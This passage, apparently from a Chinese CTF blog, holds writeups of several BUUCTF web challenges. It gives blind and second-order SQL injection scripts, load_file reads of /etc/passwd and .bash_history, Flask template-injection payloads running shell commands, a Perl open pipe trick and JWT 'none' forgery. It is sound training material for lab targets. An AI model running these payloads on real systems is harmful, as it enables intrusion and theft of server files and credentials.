&#125; $secret &#x3D; bin2hex(random_bytes(64)); if (isset($_POST[&#39;guess&#39;])) &#123; $guess &#x3D; (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message &#x3D; &#39;Wrong.&#39;; &#125; &#125; ?&gt; &lt;!doctype html&gt; &lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt; &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt; &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt; &lt;hr&gt; &lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt; &lt;?php &#125; ?&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 这里我本来以为是php伪随机数的漏洞，结果最后查了一下发现是basename函数的漏洞 它会忽略后面的[\\x80-\\xff]范围内的字符串，即非ascii字符。例子如下： php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\\x80&quot;));&#39; &#x2F;&#x2F; config.php php -r &#39;print(basename(&quot;\\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php $_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。 [CISCN2019 总决赛 Day2 Web1]Easyweb源码泄露 下载image.php.bak &lt;?php include &quot;config.php&quot;; $id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;; $path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;; $id&#x3D;addslashes($id); $path&#x3D;addslashes($path); $id&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id); $path&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path); $result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;); $row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC); $path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;]; header(&quot;Content-Type: image&#x2F;jpeg&quot;); readfile($path); GET方式传入变量id的值，若没有则为1GET方式传入变量path的值，若没有则为空addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（&#39;）、双引号（&quot;）、反斜杠（\\）str_replace()函数将两个变量内的\\0、%00、&#39;、&#39;都替换为空将变量$id与$path拼接进SQL语句脚本： import requests url &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\\\0&#39;&amp;path&#x3D;&quot; payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot; payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; database &#x3D; &quot;&quot; for i in range(1,1000): low &#x3D; 32 high &#x3D; 128 mid &#x3D; (low + high) &#x2F;&#x2F; 2 while(low &lt; high): payload &#x3D; payload4.format(i,mid) new_url &#x3D; url + payload r &#x3D; requests.get(new_url) if &quot;JFIF&quot; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (low + high) &#x2F;&#x2F; 2 if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128): break database +&#x3D; chr(mid) print(database) 得到密码和用户名登录 登录后是个文件上传的页面 这里要用文件名传一句话木马 在上传后的目录可以看到上传的文件名但是不能访问上传文件的内容 不能用php就用短标签代替 [CISCN2019 华北赛区 Day1 Web5]CyberPunk第一次遇见二次注入的题，正好学一下 源码里有个file，猜测有文件包含，可以利用伪协议读取这几个页面的源码 change.php页面 &lt;?php require_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])) &#123; $msg &#x3D; &#39;&#39;; $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;; $user_name &#x3D; $_POST[&quot;user_name&quot;]; $address &#x3D; addslashes($_POST[&quot;address&quot;]); $phone &#x3D; $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg &#x3D; &#39;no sql inject!&#39;; &#125;else&#123; $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;; $fetch &#x3D; $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row &#x3D; $fetch-&gt;fetch_assoc(); $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;]; $result &#x3D; $db-&gt;query($sql); if(!$result) &#123; echo &#39;error&#39;; print_r($db-&gt;error); exit; &#125; $msg &#x3D; &quot;订单修改成功&quot;; &#125; else &#123; $msg &#x3D; &quot;未找到订单!&quot;; &#125; &#125;else &#123; $msg &#x3D; &quot;信息不全&quot;; &#125; 主要的漏洞点就在change.php 因为其他输入位置过滤的太多，基本能注入的都被过滤了，所以只能利用address 在创建address时虽然对输入的数据进行了addslashes过滤 但之后还会对旧address进行一次sql查询 因此可以利用二次注入，再结合报错注入，和load_file函数读取flag文件 在创建时在地址中输入注入语句 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)# 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)# （这里之所以要看flag.txt根据师傅们的博客推测是纯靠猜的 在修改地址的时候就会重新调用这个sql语句，报错输出flag [CSCCTF 2019 Qual]FlaskLight一眼ssti，然后就不会了（ f12看到源码注释，get方式，参数为search 试一下传49确定是ssti config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值。 &#123;&#123; config.items() &#125;&#125; &#x2F;&#x2F; 查看配置项目的信息 例一：warnings.catch_warnings类 &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’] 最后获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; 例二： class’site._Printer’类 &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; 获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; 例三：popen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;, [RCTF2015]EasySQL这也是个二次注入 注册后登录再修改密码 利用报错注入 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))# 离谱，被骗了 重新查表 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))# 这一看就是没输出全 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))# ？？？ 这个字段里加了一堆没用的数据 只能用正则regexp过滤一下 ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)# 还是没输出全 之后就要用逆序输出了 ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)# [HITCON 2017]SSRFme进去后是php代码 直接抄的其他师傅的注释 &lt;?php if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123; $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]); &#x2F;&#x2F; explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。 $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F; “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 @mkdir($sandbox); @chdir($sandbox); &#x2F;&#x2F; 改变当前的目录到$sandbox $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); &#x2F;&#x2F; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数 $info &#x3D; pathinfo($_GET[&quot;filename&quot;]); &#x2F;&#x2F; pathinfo() 函数以数组的形式返回文件路径的信息。 $dir &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); &#x2F;&#x2F; basename() 函数返回路径中的文件名部分。 @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); &#x2F;&#x2F; 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。 简单来说就是利用传参中的url执行命令，然后将结果保存在filename中 有几个地方不太懂 ​ 1.百度的wp都说这里利用的perl脚本里的open漏洞 利用GET中的open函数漏洞。 open函数在GET命令被调用时执行，也就是第五行执行GET命令时，perl语言会调用open命令，漏洞就存在于open命令对于文件的处理上，关于这个漏洞，外国人有文章，是这样写的：Perl saw that your “file” ended with a “pipe” (vertical bar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”&#39;s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you. 翻译过来意思是 perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。 ​ 2.这里执行url传入的命令的前提是要求有个以该命令命名的文件 ?url=/&amp;filename=1.txt 看一下根目录 有两个和flag有关的文件，试flag无果，只能试试readflag ?url=&amp;filename=bash -c /readflag| 先创建一个bash -c /readflag|的文件 ?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 利用url执行命令 /sandbox/md5值/bash -c /readflag| [FBCTF2019]RCEService json格式 cmd 可以猜到执行命令格式是 {&quot;cmd&quot;:&quot;ls&quot;} 还可以直接get参数进去 但是cat参数没法直接用，还有过滤，不过可以用换行符绕过过滤 &lt;?php putenv(&#39;PATH=/home/rceservice/jail&#39;); 设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径： if (isset($_REQUEST[&#39;cmd&#39;])) &#123; $json = $_REQUEST[&#39;cmd&#39;]; if (!is_string($json)) &#123; echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;; &#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#39;, $json)) &#123; echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;; &#125; else &#123; echo &#39;Attempting to run command:&lt;br/&gt;&#39;; $cmd = json_decode($json, true)[&#39;cmd&#39;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#39;Invalid input&#39;; &#125; echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;; &#125; &#125; ?&gt; cat命令不能用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径： Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 cat 读出源码（我也很想知道网上的wp没源码之前怎么想到这么绕过的 然后找flag在的目录 找到之后利用cat读出来 [网鼎杯 2018]Comment有git泄露，用githack跑一遍，然后利用git log --reflog查看历史提交，再利用git reset回滚版本，得到原始的代码 &lt;?php include &quot;mysql.php&quot;; session_start(); if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123; header(&quot;Location: .&#x2F;login.php&quot;); die(); &#125; if(isset($_GET[&#39;do&#39;]))&#123; switch ($_GET[&#39;do&#39;]) &#123; case &#39;write&#39;: $category &#x3D; addslashes($_POST[&#39;category&#39;]); $title &#x3D; addslashes($_POST[&#39;title&#39;]); $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into board set category &#x3D; &#39;$category&#39;, title &#x3D; &#39;$title&#39;, content &#x3D; &#39;$content&#39;&quot;; $result &#x3D; mysql_query($sql); header(&quot;Location: .&#x2F;index.php&quot;); break; case &#39;comment&#39;: $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]); $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); $num &#x3D; mysql_num_rows($result); if($num&gt;0)&#123; $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;]; $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;$category&#39;, content &#x3D; &#39;$content&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); &#125; header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;); break; default: header(&quot;Location: .&#x2F;index.php&quot;); &#125; &#125; else&#123; header(&quot;Location: .&#x2F;index.php&quot;); &#125; ?&gt; 输入的内容都被addslashes过滤了，但是再comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入 在发帖部分：的category里输入x&#39;,content=database(),/* 再在提交留言里 这样可以形成多行注释，注释掉原有的content字段 可以得到数据库名称 这时查询语句为 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;, content &#x3D; &#39;*&#x2F;#&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; 即 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(), bo_id &#x3D; &#39;$bo_id&#39;&quot;; SQL读取文件用load_file()函数进行读取，值得注意的是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。 .bash_history .bash_history为在unix/linux系统下保存历史命令的文件，在用户的根目录下，即~/处。 .DS_Store文件泄露 文件泄露，有一个下载至本地的脚本，不过这题用不上。 在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666 &#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/* （我也不知道查这里的目的是什么，但是百度其他师傅的wp都有这步 应该是为了知道.bash_histroy文件的路径 &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/* 接着再查.DS_Store &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/* 为了使其全部显示，要用hex编码 然后解码 看见有个flag文件 读一下 &#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/* 再解码，拿到flag [HFCTF2020]EasyLogin注册个账号，登录，看到有个getflag但是提示权限不够 查看源码发现全是js的 看一下app.js &#x2F;** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD *&#x2F; function login() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); const token &#x3D; sessionStorage.getItem(&quot;token&quot;); $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;) .done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &quot;&#x2F;home&quot;; &#125; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function register() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;) .done(function(data) &#123; const &#123; token &#125; &#x3D; data; sessionStorage.setItem(&#39;token&#39;, token); document.location &#x3D; &quot;&#x2F;login&quot;; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function logout() &#123; $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &#39;&#x2F;login&#39;; &#125; &#125;); &#125; function getflag() &#123; $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123; const &#123;flag&#125; &#x3D; data; $(&quot;#username&quot;).val(flag); &#125;).fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; 提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞 这里需要对koa框架的目录有一定的了解 访问一下controllers路径下的api.js 额，这里赵总说是经验。。。 const crypto &#x3D; require(&#39;crypto&#39;); const fs &#x3D; require(&#39;fs&#39;) const jwt &#x3D; require(&#39;jsonwebtoken&#39;) const APIError &#x3D; require(&#39;..&#x2F;rest&#39;).APIError; module.exports &#x3D; &#123; &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123; const &#123;username, password&#125; &#x3D; ctx.request.body; if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123; throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets &#x3D; []; &#125; const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;); const secretid &#x3D; global.secrets.length; global.secrets.push(secret) const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123; const &#123;username, password&#125; &#x3D; ctx.request.body; if(!username || !password) &#123; throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;); &#125; const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid; console.log(sid) if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123; throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;); &#125; const secret &#x3D; global.secrets[sid]; const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;); const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password; if(status) &#123; ctx.session.username &#x3D; username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, &#39;GET &#x2F;api&#x2F;flag&#39;: async (ctx, next) &#x3D;&gt; &#123; if(ctx.session.username !&#x3D;&#x3D; &#39;admin&#39;)&#123; throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;); &#125; const flag &#x3D; fs.readFileSync(&#39;&#x2F;flag&#39;).toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, &#39;GET &#x2F;api&#x2F;logout&#39;: async (ctx, next) &#x3D;&gt; &#123; ctx.session.username &#x3D; null; ctx.rest(&#123; status: true &#125;) await next(); &#125; &#125;; 赵总wp里的审计: 注册 /api/register，接受传入的 username 和 password，先判断 username 不为 admin，然后生成一个 key 来以这些信息为依据，生成一个 jwt 令牌，key 同时存入全局数组。 登录 /api/login，接受传入的 username 和 password，然后从令牌的信息段中取 key 的 id，从程序中的全局数组取出 key，然后进行验证，验证通过之后置 session 中的 username 为登录时使用的 username。 获取FLAG /api/flag，判断 session 中的用户名是否为 admin，是的话就直接给 flag。 可以看到信息是用 jwt 令牌储存的，使用 jsonwebtoken 库来操作，这里用的是 HS256加密，但经过测试发现，当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。 在登录界面抓包后边这串就是jwt（当时忘了截图，这是改完jwt之后的了 之后在JSON Web Tokens - jwt.io里解码 接下来也是赵总的分析： 回到源程序逻辑中，若想让这里的密钥 key为空，就需要修改上面的 secretid。那么就尝试修改 secretid，使其无法作为全局变量 secrets 数组的索引，那么 secret 就会为空了。 注意，这里还有一个验证，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。乍看之下没有操作空间，怎么整都会取出 密钥 key。但别忘了 JavaScript 是一门弱类型语言，NodeJS 都是 JS 的语法，那自然也是咯。所以我们只要选择恰当的数据来绕过这个判断即可。可以做一个小实验来验证我们的想法。 一个小实验，空数组与数字比较永远为真，当然用空字符串之类的也可以 最后利用python的PyJWT库来加密 抓包再放包就可以读取这个flag 虎符 CTF Web 部分 Writeup – glzjin (zhaoj.in) [GYCTF2020]Ezsqlior被过滤了，没法用information查表了，但是可以用 1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103 2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format() 正确的时候返回Nu1L，错误时返回V&amp;N 爆表脚本 import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot; payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; database&#x3D; &#39;&#39; for i in range(1,1000): low &#x3D; 32 heigh &#x3D; 128 mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 while (low &lt; heigh): payload1 &#x3D; payload.format(i,mid) post_data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;post_data) print(payload1) if &quot;Nu1L&quot; in r.text: low &#x3D; mid + 1 else: heigh &#x3D; mid mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 if mid &#x3D;&#x3D; 32: break database +&#x3D;chr(mid) print(database) 得到表名后，拿不到列名，这里可以用无列名注入 先贴payload 2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 采用了字符偏移 按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符 所以最后的mid要减一才是正确的字符 这里我们传入十六进制，mysql会自动将十六进制转为字符 mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 这里要和flag的表的列数一样 最后跑一下拿flag import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot; #payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39; change &#x3D; &#39;&#39; database&#x3D; &#39;&#39; for j in range(1,100): for i in range(32,128): change &#x3D; database+chr(i) payload1 &#x3D; payload.format(change) print(payload1) data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;data) if &#39;Nu1L&#39; in r.text: database +&#x3D; chr(i-1) print(database) break [b01lers2020]Welcome to Earth抓包之后一直往下走 源码里找不到就去看js 最后可以找到一个 随机排列组合得到flag from itertools import permutations flag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;] item &#x3D; permutations(flag)#对flag全排列，返回的是iterators（迭代器） for i in item: k &#x3D; &#39;&#39;.join(i)#join连接成为字符串 if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;这里还可以用python的startswich方法判断是否是pctf&#123;hey开头 &#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;: print(k) [watevrCTF-2019]Cookie Store抓session，base64解码把金额改成100，放包 [网鼎杯 2020 白虎组]PicDown 源码没东西，只有个url的get参数，还以为是ssrf之类的，搜了下wp，这里可能是因为环境原因，有个非预期解 非预期解： 有文件读取，直接url=/flag就能下载一个beautiful.jpg,改成txt就能看见flag 预期解： /proc/self/目录的意义 我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。 读一下app.py url=app.py from flask import Flask, Response from flask import render_template from flask import request import os import urllib app &#x3D; Flask(__name__) SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot; f &#x3D; open(SECRET_FILE) SECRET_KEY &#x3D; f.read().strip() os.remove(SECRET_FILE) @app.route(&#39;&#x2F;&#39;) def index(): return render_template(&#39;search.html&#39;) @app.route(&#39;&#x2F;page&#39;) def page(): url &#x3D; request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res &#x3D; urllib.urlopen(url) value &#x3D; res.read() response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;) response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39; return response else: value &#x3D; &quot;HACK ERROR!&quot; except: value &#x3D; &quot;SOMETHING WRONG!&quot; return render_template(&#39;search.html&#39;, res&#x3D;value) @app.route(&#39;&#x2F;no_one_know_the_manager&#39;) def manager(): key &#x3D; request.args.get(&quot;key&quot;) print(SECRET_KEY) if key 